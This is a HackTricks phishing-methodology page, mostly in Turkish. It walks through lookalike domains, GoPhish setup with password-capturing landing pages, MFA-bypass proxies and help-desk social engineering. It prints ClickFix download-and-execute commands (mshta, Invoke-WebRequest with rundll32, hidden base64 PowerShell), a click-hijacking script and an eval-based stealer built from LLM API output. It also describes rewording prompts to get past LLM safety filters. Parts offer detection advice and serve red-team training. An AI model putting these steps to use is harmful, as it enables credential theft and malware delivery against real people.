# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Kurbanı recon et
1. **Victim domain** seç.
2. Kurbanın kullandığı **login portals** arayarak bazı temel web enumeration yap ve hangisini **impersonate** edeceğine **karar ver**.
3. Email'leri **bulmak** için biraz **OSINT** kullan.
2. Ortamı hazırla
1. Phishing assessment için kullanacağın **domain'i satın al**
2. Email service ile ilgili kayıtları (**SPF, DMARC, DKIM, rDNS**) **configure et**
3. VPS'i **gophish** ile configure et
3. Campaign'i hazırla
1. **Email template** hazırla
2. Credentials'ı çalmak için **web page** hazırla
4. Campaign'i başlat!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Domain name, orijinal domain'in önemli bir **keyword**'ünü **içerir** (örn. zelster.com-management.com).
- **hypened subdomain**: Bir subdomain'de **nokta yerine tire** kullanır (örn. www-zelster.com).
- **New TLD**: Aynı domaini **new TLD** ile kullanır (örn. zelster.org)
- **Homoglyph**: Domain name'deki bir harfi benzer görünen **harflerle** değiştirir (örn. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain name içindeki iki harfi **yer değiştirir** (örn. zelsetr.com).
- **Singularization/Pluralization**: Domain name'in sonuna “s” ekler veya kaldırır (örn. zeltsers.com).
- **Omission**: Domain name'deki harflerden birini **çıkarır** (örn. zelser.com).
- **Repetition:** Domain name'deki harflerden birini **tekrarlar** (örn. zeltsser.com).
- **Replacement**: Homoglyph gibi ama daha az stealthy. Domain name'deki harflerden birini değiştirir, belki de orijinal harfe keyboard üzerinde yakın bir harfle (örn, zektser.com).
- **Subdomained**: Domain name'in içine bir **nokta** ekler (örn. ze.lster.com).
- **Insertion**: Domain name'e bir harf **ekler** (örn. zerltser.com).
- **Missing dot**: TLD'yi domain name'e ekler. (örn. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

**Olabilecek bir ihtimal**, saklanan veya iletişimde olan bit'lerden birinin solar flare'ler, cosmic rays veya hardware error'lar nedeniyle otomatik olarak tersine dönebilmesidir.

Bu kavram **DNS requests**'e uygulandığında, **DNS server** tarafından alınan domain, başlangıçta istenen domain ile aynı olmayabilir.

Örneğin, "windows.com" domain'inde tek bir bit değişikliği onu "windnws.com." haline getirebilir.

Saldırganlar, kurbanın domain'ine benzeyen birden fazla bit-flipping domain kaydederek bundan **yararlanabilir**. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) okuyun

### Buy a trusted domain

[https://www.expireddomains.net/](https://www.expireddomains.net) içinde kullanabileceğin bir expired domain arayabilirsin.\
Satın alacağın expired domain'in **zaten iyi bir SEO**'ya sahip olduğundan emin olmak için, şu yerlerde nasıl kategorize edildiğine bakabilirsin:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha **fazla** geçerli email adresi **bulmak** veya zaten bulduklarını **doğrulamak** için, kurbanın smtp server'larında brute-force yapıp yapamayacağını kontrol edebilirsin. [Email address'i burada doğrulamayı/bulmayı öğrenin](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca, kullanıcılar maillerine erişmek için **herhangi bir web portal** kullanıyorsa, bunun **username brute force**'a karşı zayıf olup olmadığını kontrol edebilir ve mümkünse açığı sömürebilirsin.

## Configuring GoPhish

### Installation

Bunu [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsin

İndirip `/opt/gophish` içine aç ve `/opt/gophish/gophish` çalıştır\
Çıktıda, 3333 portundaki admin user için bir password verilecek. Bu yüzden o porta eriş ve bu credentials ile admin password'ünü değiştir. O portu local'e tunnel etmen gerekebilir:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Yapılandırma

**TLS sertifika yapılandırması**

Bu adımdan önce kullanacağınız **alan adını zaten satın almış** olmalısınız ve bu alan adı **gophish** yapılandırdığınız **VPS'nin IP adresini** **işaret ediyor** olmalıdır.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Kuruluma başlayın: `apt-get install postfix`

Ardından domain’i şu dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ayrıca /etc/postfix/main.cf içindeki şu değişkenlerin değerlerini de değiştirin**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını domain adınıza göre değiştirin ve **VPS’nizi yeniden başlatın.**

Şimdi, **VPS’nin ip address**’ine işaret eden `mail.<domain>` için bir **DNS A record** ve `mail.<domain>`’e işaret eden bir **DNS MX** record oluşturun.

Şimdi bir email göndermeyi test edelim:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

gophish yürütmesini durdurun ve yapılandıralım.\
`/opt/gophish/config.json` dosyasını aşağıdaki gibi değiştirin (https kullanımına dikkat edin):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish servisini yapılandırın**

gophish servisinin otomatik olarak başlatılabilmesi ve bir servis olarak yönetilebilmesi için `/etc/init.d/gophish` dosyasını aşağıdaki içerikle oluşturabilirsiniz:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Servisi yapılandırmayı tamamlayın ve bunu kontrol etmek için şunu yapın:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mail server ve domain yapılandırma

### Wait & be legit

Bir domain ne kadar eskiyse spam olarak yakalanma olasılığı o kadar düşüktür. Bu nedenle phishing assessment öncesinde mümkün olduğunca uzun süre beklemelisiniz (en az 1 hafta). Ayrıca, itibarlı bir sektöre ait bir sayfa koyarsanız elde edilen itibar daha iyi olacaktır.

Bir hafta beklemeniz gerekse bile, tüm yapılandırmayı şimdi tamamlayabileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydı yapılandırma

VPS’nin IP adresini domain adına çözen bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) Kaydı

Yeni domain için bir SPF kaydı **yapılandırmalısınız**. SPF kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF politikanızı oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) kullanabilirsiniz (VPS makinesinin IP’sini kullanın)

![Phishing domain için SPF kaydı oluşturma SPF Wizard formu](<../../images/image (1037).png>)

Bu, domain içindeki bir TXT kaydına ayarlanması gereken içeriktir:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Yeni domain için bir DMARC kaydı **yapılandırmalısınız**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Aşağıdaki içerikle `_dmarc.<domain>` hostname’ine işaret eden yeni bir DNS TXT kaydı oluşturmanız gerekir:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Yeni alan adı için bir DKIM yapılandırmalısınız. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu eğitim şuna dayanmaktadır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM anahtarının ürettiği her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### E-posta yapılandırma skorunuzu test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sadece sayfaya erişin ve size verdikleri adrese bir e-posta gönderin:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ayrıca `check-auth@verifier.port25.com` adresine bir e-posta göndererek **e-posta yapılandırmanızı kontrol edebilir** ve **yanıtı okuyabilirsiniz** (bunun için port **25**'i **açmanız** ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ayrıca kontrolünüz altındaki bir Gmail’e **mesaj** gönderebilir ve Gmail gelen kutunuzdaki **e-posta başlıklarını** kontrol edebilirsiniz; `dkim=pass`, `Authentication-Results` başlık alanında bulunmalıdır.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklist’inden Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, domain’inizin spamhouse tarafından engellenip engellenmediğini gösterebilir. Domain/IP’nizin kaldırılmasını şu adresten talep edebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist’inden Kaldırma

​​Domain/IP’nizin kaldırılmasını şu adresten talep edebilirsiniz: [https://sender.office.com/](https://sender.office.com).

## GoPhish Campaign Oluşturma ve Başlatma

### Sending Profile

- Sender profile’ı tanımlamak için bir **isim** belirleyin
- Phishing emails göndermek için hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Username ve password alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Test emails’leri blacklist’e düşmemek için **10min mail adreslerine** göndermenizi öneririm.

### Email Template

- Template’i tanımlamak için bir **isim** belirleyin
- Ardından bir **subject** yazın (garip bir şey değil, normal bir email’de okumayı bekleyebileceğiniz bir şey)
- "**Add Tracking Image**" seçeneğinin işaretli olduğundan emin olun
- **email template**’i yazın (aşağıdaki örnekteki gibi variables kullanabilirsiniz):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **e-postanın güvenilirliğini artırmak için**, istemciden gelen bir e-postadaki bir imzayı kullanmanız önerilir. Öneriler:

- **Var olmayan bir adrese** bir e-posta gönderin ve yanıtın herhangi bir imza içerip içermediğini kontrol edin.
- info@ex.com veya press@ex.com ya da public@ex.com gibi **public e-postaları** arayın, onlara bir e-posta gönderin ve yanıtı bekleyin.
- Bulunan **bazı geçerli** bir e-posta ile iletişime geçmeyi deneyin ve yanıtı bekleyin

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template ayrıca göndermek için **dosya eklemenize** de izin verir. Özel olarak hazırlanmış bazı dosyalar/belgeler kullanarak NTLM challenges çalmak isterseniz [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Bir **isim** yazın
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **import** edebileceğinizi unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** seçeneklerini işaretleyin
- Bir **redirection** ayarlayın

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve sonuçları beğenene kadar yerelde (belki bir Apache server kullanarak) bazı testler yapmanız gerekir. Sonra o HTML kodunu kutuya yazın.\
> HTML için **static resources** kullanmanız gerekirse (belki bazı CSS ve JS sayfaları) onları _**/opt/gophish/static/endpoint**_ içine kaydedebilir ve sonra _**/static/\<filename>**_ üzerinden erişebilirsiniz

> [!TIP]
> Redirection için kullanıcıları mağdurun yasal ana web sayfasına **yönlendirebilir** veya örneğin onları _/static/migration.html_ adresine yönlendirebilir, 5 saniye boyunca bir **dönen tekerlek (**[**https://loading.io/**](https://loading.io)**)** koyabilir ve ardından işlemin başarılı olduğunu belirtebilirsiniz.

### Users & Groups

- Bir ad belirleyin
- Verileri **import** edin (örneğin template’i kullanmak için her kullanıcının firstname, last name ve email address bilgisine ihtiyacınız olduğunu unutmayın)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Son olarak, bir isim, email template, landing page, URL, sending profile ve grup seçerek bir campaign oluşturun. URL’nin, kurbanlara gönderilen bağlantı olacağını unutmayın

**Sending Profile**’ın, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermeye izin verdiğini unutmayın:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Test e-postalarını blacklist’e takılmamak için 10min mails adreslerine göndermenizi öneririm.

Her şey hazır olduğunda, campaign’i başlatın!

## Website Cloning

Herhangi bir nedenle website’i clone etmek isterseniz aşağıdaki sayfayı kontrol edin:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bazı phishing assessments’te (özellikle Red Team’lerde) ayrıca bir tür backdoor içeren dosyalar göndermek isteyeceksiniz (belki bir C2 ya da belki sadece bir authentication tetikleyecek bir şey).\
Bazı örnekler için aşağıdaki sayfaya bakın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Önceki saldırı oldukça zekicedir; çünkü gerçek bir website’i taklit eder ve kullanıcının girdiği bilgileri toplarsınız. Ne yazık ki, kullanıcı doğru password’u girmezse veya taklit ettiğiniz application 2FA ile yapılandırılmışsa, **bu bilgiler kandırılan kullanıcıyı taklit etmenize izin vermez**.

İşte bu noktada [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi tools faydalıdır. Bu tool bir MitM benzeri attack oluşturmanıza izin verir. Temel olarak attack şu şekilde çalışır:

1. Gerçek web sayfasının login formunu **taklit edersiniz**.
2. Kullanıcı **credentials** bilgilerini sahte sayfanıza **gönderir** ve tool bunları gerçek web sayfasına göndererek **credentials’ın çalışıp çalışmadığını kontrol eder**.
3. Account **2FA** ile yapılandırılmışsa, MitM sayfası bunu ister ve **kullanıcı girdiğinde** tool bunu gerçek web sayfasına gönderir.
4. Kullanıcı authenticated olduğunda siz (attacker olarak) tool MitM yaparken gerçekleşen her etkileşimin **credentials**, **2FA**, **cookie** ve **herhangi bir bilgisini** ele geçirmiş olursunuz.

### Via VNC

Ya kurbanı orijinaline benzeyen kötü amaçlı bir sayfaya **göndermek** yerine, onu gerçek web sayfasına bağlı bir browser içeren bir **VNC session**’ına gönderirseniz? Yaptıklarını görebilir, password’u, kullanılan MFA’yı, cookie’leri çalabilirsiniz...\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz

## Detecting the detection

Açığa çıkıp çıkmadığınızı anlamanın en iyi yollarından biri açıkça **domain’inizi blacklist’lerde aramaktır**. Listelenmişse, domain’iniz bir şekilde şüpheli olarak tespit edilmiştir.\
Domain’inizin herhangi bir blacklist’te görünüp görünmediğini kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) kullanmaktır

Bununla birlikte, mağdurun sahada **aktif olarak şüpheli phishing activity** arayıp aramadığını anlamanın başka yolları da vardır; açıklandığı gibi:


{{#ref}}
detecting-phising.md
{{#endref}}

Mağdurun domain’iyle **çok benzer bir ada sahip** bir domain **satın alabilir** ve/veya size ait bir domainin **subdomain**’i için, mağdurun domain’inin **keyword**’ünü **içeren** bir **certificate** üretebilirsiniz. **Mağdur** onlarla herhangi bir tür **DNS veya HTTP interaction** gerçekleştirirse, şüpheli domain’leri **aktif olarak araştırdığını** anlarsınız ve çok stealth olmanız gerekir.

### Evaluate the phishing

E-postanızın spam folder’a düşüp düşmeyeceğini, engellenip engellenmeyeceğini veya başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious)kullanın.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set’ler giderek email lure’ları tamamen atlayıp MFA’yı yenmek için **doğrudan service-desk / identity-recovery workflow**’unu hedefliyor. Saldırı tamamen "living-off-the-land" tarzındadır: operatör geçerli credentials elde ettiğinde yerleşik admin tool’larıyla pivot yapar – malware gerekmez.

### Attack flow
1. Kurbanı recon edin
* LinkedIn, data breaches, public GitHub vb. kaynaklardan kişisel ve kurumsal bilgileri toplayın.
* Yüksek değerli kimlikleri (executive’ler, IT, finance) belirleyin ve password / MFA reset için **tam help-desk process**’i çıkarın.
2. Gerçek zamanlı social engineering
* Hedefi taklit ederek help-desk’i phone, Teams veya chat ile arayın; çoğu zaman **spoofed caller-ID** veya **cloned voice** kullanılır.
* Bilgi tabanlı doğrulamadan geçmek için önceden toplanmış PII’yi verin.
* Agent’i **MFA secret**’ını resetlemeye veya kayıtlı bir mobile number üzerinde **SIM-swap** yapmaya ikna edin.
3. Erişim sonrası hemen yapılacak işlemler (gerçek vakalarda ≤60 dk)
* Herhangi bir web SSO portalı üzerinden foothold oluşturun.
* Yerleşik araçlarla AD / AzureAD’yi enumerate edin (binary bırakmadan):
```powershell
# directory gruplarını ve ayrıcalıklı rolleri listele
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – directory rolleri listele
Get-MgDirectoryRole | ft DisplayName,Id

# Hesabın login olabildiği device'ları enumerate et
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ortamda zaten whitelist edilmiş **WMI**, **PsExec** veya meşru **RMM** agent’ları ile lateral movement yapın.

### Detection & Mitigation
* Help-desk identity recovery’yi **privileged operation** olarak ele alın – step-up auth ve manager approval zorunlu kılın.
* Şunlara alarm üreten **Identity Threat Detection & Response (ITDR)** / **UEBA** kuralları dağıtın:
* MFA method değişti + yeni device / geo’dan authentication.
* Aynı principal’in hemen elevation alması (user-→-admin).
* Help-desk çağrılarını kaydedin ve herhangi bir resetten önce mevcut kayıtlı bir numaraya **call-back** uygulanmasını zorunlu kılın.
* Yeni resetlenen hesapların otomatik olarak yüksek yetkili token’ları devralmaması için **Just-In-Time (JIT) / Privileged Access** uygulayın.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity ekipler, yüksek dokunuşlu operasyonların maliyetini, **search engines & ad networks**’ü dağıtım kanalı haline getiren kitle saldırılarıyla dengeler.

1. **SEO poisoning / malvertising**, `chromium-update[.]site` gibi sahte bir sonucu arama reklamlarının en üstüne iter.
2. Kurban, küçük bir **first-stage loader** indirir (çoğunlukla JS/HTA/ISO). Unit 42’nin gördüğü örnekler:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader browser cookies + credential DB’lerini dışarı sızdırır, ardından **silent loader**’ı çeker; bu loader, gerçek zamanlı olarak şuna karar verir:
* RAT (ör. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Yeni kayıt edilmiş domain’leri engelleyin ve *search-ads* ile email üzerinde de **Advanced DNS / URL Filtering** uygulayın.
* Software installation’ı imzalı MSI / Store paketleriyle sınırlayın, policy ile `HTA`, `ISO`, `VBS` çalıştırılmasını engelleyin.
* Tarayıcıların installer açan child process’lerini izleyin:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* İlk aşama loader’ların sıkça kötüye kullandığı LOLBin’leri avlayın (ör. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Bazı sahte software portal’lar görünen download `href`’ini **gerçek** GitHub/release URL’sine işaret edecek şekilde bırakır ancak JavaScript’te ilk kullanıcı etkileşimini ele geçirir ve kurbanı bunun yerine bir **Traffic Distribution System (TDS)** chain’ine gönderir.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ana özellikler:
- Hook genellikle `document` üzerinde **capture phase** (`true`) içinde çalışır, bu yüzden site handler’larından önce tetiklenir.
- Chrome, redirect’i geçerli bir **user gesture** ile ilişkilendirmek ve popup-blocker bypass’ını iyileştirmek için sık sık `click` yerine `mousedown` kullanır.
- Bazı varyantlar önceden `about:blank` açar veya `<a target="_blank">` click’lerini synthesize eder ve ancak daha sonra TDS URL’sini atar.
- Browser-side cap’ler genellikle `localStorage` içinde tutulur, bu yüzden **first click** malware’e ulaşırken refresh/retry’ler zararsız görünen visible link’e geri dönebilir.
- TDS; referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter kontrolleri, click context ve per-session sayaçlara göre gate edebilir; bu da analyst replay’lerini deterministic olmaktan çıkarır.

Defender fikirleri:
- Görüntülenen `href` ile click anında üretilen gerçek navigation target’ı karşılaştırın.
- `window.open`, `about:blank` veya synthetic anchor click’ler etrafında hem `preventDefault()` hem de `stopImmediatePropagation()` çağıran `document.addEventListener(..., true)` handler’larını avlayın.
- Aynı CloudFront/JS stage’i yükleyen yeni kayıtlı software-download domain kümelerini yüksek sinyal veren bir SEO-poisoning/TDS paterni olarak değerlendirin.

### Sahte verification sayfalarından ClickFix + archive-looking LOLBAS fetch’leri
Bazı TDS branch’leri, kurbana şu gibi trusted bir Windows binary çalıştırmasını söyleyen sahte bir verification sayfasıyla (Cloudflare/IUAM stili) sonlanır:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` executes the **HTA/VBScript at the start of the response**, even if the URL pretends to be a `.7z` archive; appended archive data can be pure decoy.
- Follow-on stages often keep lying about file type (`.rtf` for PowerShell, `.asar` for Python, ZIPs with padded binaries) and then switch to **manual PE mapping / in-memory execution**.
- If you are responding to one of these chains, preserve **network + memory from the first successful run**: later replays may only show a benign installer/SFX path or fail because the payload/key release was bound to the original TDS session.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` drops the payload to `%TEMP%`, a short sleep hides network jitter, then `rundll32` calls the exported entrypoint (`notepad`).
* The DLL beacons host identity and polls C2 every few minutes. Remote tasking arrives as **base64-encoded PowerShell** executed hidden and with policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* This preserves C2 flexibility (server can swap tasks without updating the DLL) and hides console windows. Hunt for PowerShell children of `rundll32.exe` using `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` together.
* Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals after DLL load.

---

## AI-Enhanced Phishing Operations
Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** for high-risk phone requests.
• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Evasion traits**
- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
- No static payload; malicious JS exists only after render.
- Non-deterministic generations produce **unique** stealers per session.

**Detection ideas**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
